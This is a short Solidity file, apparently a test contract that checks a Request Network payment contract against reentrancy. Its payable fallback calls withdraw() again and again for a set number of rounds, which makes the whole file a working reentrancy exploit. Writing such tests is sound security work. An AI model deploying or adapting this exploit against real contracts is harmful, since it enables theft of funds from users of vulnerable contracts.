pragma solidity 0.4.18;

contract RequestEthereumWeak {

    function createRequestAsPayee(address _payer, int256 _expectedAmount, address _extension, bytes32[9] _extensionParams, string _data) public returns(bytes32);

    function withdraw() public;

}


contract TestRequestReentrance {

    address contractAdd;
    uint8 round;

    event Log(bytes32 id);

    function TestRequestReentrance(address _contract, uint8 _round) public {
        contractAdd = _contract;
        round = _round;
    }

    function init(address _payer) public {
        RequestEthereumWeak weakContract = RequestEthereumWeak(contractAdd);
        bytes32[9] memory empty;
        bytes32 id = weakContract.createRequestAsPayee(_payer, 100000000000000000, 0, empty, "");
        Log(id);
    }

    function start() public {
        round--;
        RequestEthereumWeak weakContract = RequestEthereumWeak(contractAdd);
        weakContract.withdraw();
    }

    // Launcher -------------------------------------------------
    function ()
        public
        payable
    {   
        if(round != 0) {
            round--;
            RequestEthereumWeak weakContract = RequestEthereumWeak(contractAdd);
            weakContract.withdraw();
        }
    } 
}

